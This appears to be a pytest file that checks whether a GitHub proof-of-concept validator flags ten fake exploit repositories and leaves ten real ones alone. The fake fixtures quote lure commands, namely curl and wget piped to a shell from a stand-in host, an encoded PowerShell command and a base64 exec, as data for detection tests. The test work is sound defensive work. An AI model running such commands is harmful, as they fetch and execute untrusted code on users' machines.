"""Fake-PoC rules of the PoC validator on 10 real and 10 fake GitHub repositories.

Real: metadata of 10 well-known public PoC repositories, fetched from the GitHub REST API on 2026-11-18
(tests/data/poc_real_repos.json). Fake: repositories in the form public reports describe them (fake PoCs for
LDAPNightmare CVE-2024-49113 delivering an infostealer from a release binary; CVE-2023-35829 / CVE-2023-20871
fakes running a downloader through curl | bash; CVE-2022-26809 / CVE-2022-24500 fakes running hidden
PowerShell; "private exploit" sales repositories; archive-with-password lures; an empty repository; a script
decoding a base64 payload). The rule set must flag every fake as not a PoC and leave every real one unflagged.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from threat_retrieval_engine.poc_intelligence.poc_validator import PoCValidator
from threat_retrieval_engine.poc_intelligence.sources.github_scraper import GitHubPoCSource

REAL = json.loads((Path(__file__).parent / "data" / "poc_real_repos.json").read_text(encoding="utf-8"))["repositories"]


def _repo(name, desc, language=None, size=100, stars=3, owner="newuser2026"):
    return {"name": name, "full_name": f"{owner}/{name}", "html_url": f"https://github.com/{owner}/{name}",
            "description": desc, "stargazers_count": stars, "forks_count": 0, "language": language, "fork": False,
            "archived": False, "created_at": "2026-11-01T00:00:00Z", "size": size,
            "owner": {"login": owner, "html_url": f"https://github.com/{owner}"}}


FAKE = [
    ("CVE-2024-49113", _repo("CVE-2024-49113", "LDAPNightmare PoC exploit. Download poc.exe from the releases page and run it", None)),
    ("CVE-2023-35829", _repo("CVE-2023-35829-poc", "PoC exploit for CVE-2023-35829. Build: make, then run: curl -s http://x.example/a.sh | bash", "C")),
    ("CVE-2023-20871", _repo("CVE-2023-20871-poc", "VMware Fusion exploit PoC. Install step: wget -q http://x.example/i | sh", "C")),
    ("CVE-2022-26809", _repo("CVE-2022-26809-RCE", "RPC RCE exploit for CVE-2022-26809, run CVE-2022-26809.exe", None)),
    ("CVE-2022-24500", _repo("CVE-2022-24500", "SMB exploit CVE-2022-24500 poc: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi", "PowerShell")),
    ("CVE-2025-29927", _repo("CVE-2025-29927-exploit", "Private exploit for CVE-2025-29927, 100% working, FUD. Contact me on telegram t.me/seller", None)),
    ("CVE-2024-3400", _repo("CVE-2024-3400", "CVE-2024-3400 exploit. Download the exploit from here: exploit.rar archive password: 2024", None)),
    ("CVE-2024-6387", _repo("CVE-2024-6387-RCE", "regreSSHion CVE-2024-6387 RCE exploit, join our discord discord.gg/abcdef for the builder", None)),
    ("CVE-2024-21413", _repo("CVE-2024-21413", "Outlook CVE-2024-21413 PoC exploit", None, size=0)),
    ("CVE-2026-48908", _repo("CVE-2026-48908-poc", "PoC exploit CVE-2026-48908: exec(base64.b64decode(payload)) in exploit.py", "Python")),
]

POC_LABELS = {"HIGH_RELEVANCE_POC_CANDIDATE", "POSSIBLE_POC"}


def _classify(cve, item):
    gh = GitHubPoCSource()
    cand = gh._candidate_from_repository(item, cve_id=cve, query=cve)
    return PoCValidator().validate_candidate(cand, cve)


@pytest.mark.parametrize("rec", REAL, ids=[r["item"]["full_name"] for r in REAL])
def test_real_repositories_are_not_flagged(rec):
    r = _classify(rec["cve_id"], rec["item"])
    assert r.confidence_label != "SUSPICIOUS", r.warning_flags
    assert not {"binary_only", "obfuscated_code", "scam_marketing", "empty_repository"} & set(r.warning_flags)


@pytest.mark.parametrize("cve,item", FAKE, ids=[f[1]["name"] for f in FAKE])
def test_fake_repositories_are_not_classed_as_pocs(cve, item):
    r = _classify(cve, item)
    assert r.confidence_label not in POC_LABELS, (r.confidence_label, r.score_reasons)
    assert r.warning_flags, "a fake must carry a warning"


def test_counts():
    assert len(REAL) == 10 and len(FAKE) == 10
